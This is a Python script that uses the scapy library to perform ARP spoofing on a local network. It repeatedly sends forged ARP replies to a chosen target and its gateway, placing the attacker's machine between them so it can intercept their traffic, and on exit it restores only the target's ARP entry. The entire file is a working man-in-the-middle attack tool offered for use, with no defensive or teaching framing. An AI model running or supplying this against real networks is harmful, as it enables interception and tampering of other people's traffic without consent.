#! /usr/bin/env python

import scapy.all as scapy
import time
import sys

import optparse

def getArg():
            parser= optparse.OptionParser()

            parser.add_option("-t","--target",dest="target",help="Provide Range of network mask/target ip")
            parser.add_option("-g","--gateway",dest="gateway",help="Provide gateway ip")
            (options,arguments)=parser.parse_args()
            return options

def getMac(ip):
    arp_req = scapy.ARP(pdst=ip)
    brodcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_brod= brodcast/arp_req

    ans_list= scapy.srp(arp_brod,timeout=1, verbose=False)[0]
    return ans_list[0][1].hwsrc

def restore(des,source):
    des_mac=getMac(des)
    source_mac=getMac(source)
    packet = scapy.ARP(op=2,pdst=des,hwdst=des_mac, psrc=source, hwsrc=source_mac)
    scapy.send(packet,verbose=False,count=4)


#now we will create arp packets
def spoof(targe_ip,spoof_ip):
    target_mac=getMac(targe_ip)
    packet = scapy.ARP(op=2,pdst=targe_ip,hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet,verbose=False)

counts=0
options=getArg()
gateway=options.gateway
target=options.target
try:
    while True:
        spoof(target,gateway)
        spoof(gateway,target)
        counts+=2
        print("\r[+] Send packets: {}".format(counts)),
        sys.stdout.flush()
        time.sleep(1)
except KeyboardInterrupt as e:
    print("[+] Detecting CTRL + C ... Quitting")
    restore(target,gateway)
